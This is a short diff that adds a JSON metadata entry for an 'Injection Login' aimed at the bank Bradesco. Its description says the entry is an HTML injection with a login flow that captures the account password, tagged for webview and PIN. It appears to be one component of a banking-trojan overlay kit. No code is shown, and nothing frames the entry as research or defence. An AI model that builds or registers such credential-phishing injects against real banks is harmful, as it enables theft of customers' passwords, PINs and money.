@@ -1,0 +1,7 @@
+{
+  "id": "Bradesco",
+  "name": "Injection Login",
+  "bank": "Bradesco",
+  "description": "Injection HTML com fluxo de login e captura de senha de acesso.",
+  "tags": ["login", "webview", "bradesco", "pin"]
+}
